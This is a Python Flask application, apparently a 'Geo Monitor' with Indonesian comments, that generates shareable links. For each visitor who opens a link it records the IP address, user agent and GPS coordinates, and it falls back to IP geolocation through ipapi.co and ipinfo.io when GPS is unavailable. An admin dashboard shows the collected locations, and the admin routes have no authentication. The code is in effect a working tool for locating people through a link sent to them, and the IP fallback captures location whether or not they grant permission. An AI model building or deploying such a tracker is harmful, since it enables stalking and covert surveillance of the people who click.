# app.py
from flask import Flask, render_template, request, jsonify, redirect, url_for
import requests, math, ipaddress, os, json
from uuid import uuid4
from datetime import datetime

APP_NAME = "Geo Monitor (Admin)"
PORT = 5055
DATA_FILE = os.environ.get("DATA_FILE", "store.json")

app = Flask(__name__)

# ====== STORAGE (tanpa DB) ======
STORE = {"channels": {}}  # { token: { "created_at": "...", "hits":[...] } }

def load_store():
    global STORE
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                STORE = json.load(f)
        except Exception:
            STORE = {"channels": {}}

def save_store():
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(STORE, f, ensure_ascii=False, indent=2)
    except Exception:
        pass

load_store()

def now_iso():
    return datetime.utcnow().isoformat(timespec="seconds") + "Z"

# ===== Helpers =====
def get_client_ip(req):
    for h in ["X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP", "X-Client-IP", "Fastly-Client-IP"]:
        v = req.headers.get(h)
        if v: return v.split(",")[0].strip()
    return req.remote_addr

def is_private_ip(ip: str) -> bool:
    try:
        ip_obj = ipaddress.ip_address(ip)
        return ip_obj.is_private or ip in ("127.0.0.1", "::1")
    except Exception:
        return True

def bbox_from_point(lat, lon, km=1.2):
    lat = float(lat); lon = float(lon)
    lat_delta = km / 111.0
    cos_lat = max(0.01, abs(math.cos(math.radians(lat))))
    lon_delta = km / (111.320 * cos_lat)
    return (lon - lon_delta, lat - lat_delta, lon + lon_delta, lat + lat_delta)

def lookup_ip_location(ip: str):
    # 1) ipapi.co
    try:
        r = requests.get(f"https://ipapi.co/{ip}/json/", timeout=4)
        if r.ok:
            j = r.json()
            lat, lon = j.get("latitude"), j.get("longitude")
            if lat and lon:
                city, region, country = j.get("city"), j.get("region"), j.get("country_name")
                return {
                    "lat": float(lat), "lon": float(lon), "acc": None,
                    "source": "ipapi.co",
                    "label": ", ".join([x for x in [city, region, country] if x]),
                    "raw": j
                }
    except Exception:
        pass
    # 2) ipinfo.io
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=4)
        if r.ok:
            j = r.json()
            loc = j.get("loc")
            if loc:
                lat, lon = loc.split(",", 1)
                city, region, country = j.get("city"), j.get("region"), j.get("country")
                return {
                    "lat": float(lat), "lon": float(lon), "acc": None,
                    "source": "ipinfo.io",
                    "label": ", ".join([x for x in [city, region, country] if x]),
                    "raw": j
                }
    except Exception:
        pass
    return None

def ensure_channel(token: str):
    if token not in STORE["channels"]:
        STORE["channels"][token] = {"created_at": now_iso(), "hits": []}

# ===== Routes =====
@app.route("/")
def home():
    return redirect(url_for("admin_home"))

# Admin: daftar channel + buat link baru
@app.route("/admin", methods=["GET", "POST"])
def admin_home():
    if request.method == "POST":
        slug = (request.form.get("slug") or "").strip()
        token = slug if slug else uuid4().hex[:8]
        ensure_channel(token)
        save_store()
        return redirect(url_for("admin_channel", token=token))
    base = request.host_url.rstrip("/")
    channels = STORE["channels"]
    return render_template("admin.html", app_name=APP_NAME, base=base, channels=channels)

# Admin: lihat channel tertentu (map + table live)
@app.route("/admin/<token>")
def admin_channel(token):
    ensure_channel(token)
    base = request.host_url.rstrip("/")
    return render_template("admin.html", app_name=APP_NAME, base=base, channels=STORE["channels"], focus=token)

# Link yang dibagikan ke orang lain (user publik)
@app.route("/t/<token>")
def share_page(token):
    ensure_channel(token)
    base = request.host_url.rstrip("/")
    return render_template("share.html", app_name=APP_NAME, token=token, base=base)

# API: terima lokasi (GPS/ IP fallback)
@app.route("/api/track/<token>", methods=["POST"])
def api_track(token):
    ensure_channel(token)
    ip = get_client_ip(request)
    ua = request.headers.get("User-Agent", "")
    body = request.get_json(silent=True) or {}

    # Data dari klien (GPS)
    lat = body.get("lat")
    lon = body.get("lon")
    acc = body.get("acc")
    src = "gps" if lat is not None and lon is not None else "ip"

    # Jika tidak ada GPS, coba fallback IP
    ip_meta = None
    if lat is None or lon is None:
        if not is_private_ip(ip):
            meta = lookup_ip_location(ip)
            if meta:
                lat, lon, acc = meta["lat"], meta["lon"], meta["acc"]
                ip_meta = meta
                src = meta["source"]

    if lat is None or lon is None:
        return jsonify({"ok": False, "error": "no_location"}), 200

    item = {
        "id": uuid4().hex[:8],
        "ts": now_iso(),
        "ip": ip,
        "ua": ua,
        "coords": { "lat": float(lat), "lon": float(lon), "acc": acc, "source": src },
        "ip_label": ip_meta["label"] if ip_meta and ip_meta.get("label") else None
    }

    STORE["channels"][token]["hits"].append(item)
    # batasi memori
    STORE["channels"][token]["hits"] = STORE["channels"][token]["hits"][-1000:]
    save_store()
    return jsonify({"ok": True})

# API: ambil lokasi-lokasi untuk admin (polling)
@app.route("/api/locations/<token>")
def api_locations(token):
    ensure_channel(token)
    since = request.args.get("since")  # ISO
    hits = STORE["channels"][token]["hits"]
    if since:
        # filter hanya yang lebih baru
        newer = [h for h in hits if h["ts"] > since]
        return jsonify({"ok": True, "hits": newer})
    return jsonify({"ok": True, "hits": hits})

# Utility: hapus data channel (opsional)
@app.route("/api/clear/<token>", methods=["POST"])
def api_clear(token):
    ensure_channel(token)
    STORE["channels"][token]["hits"] = []
    save_store()
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=PORT, debug=True)
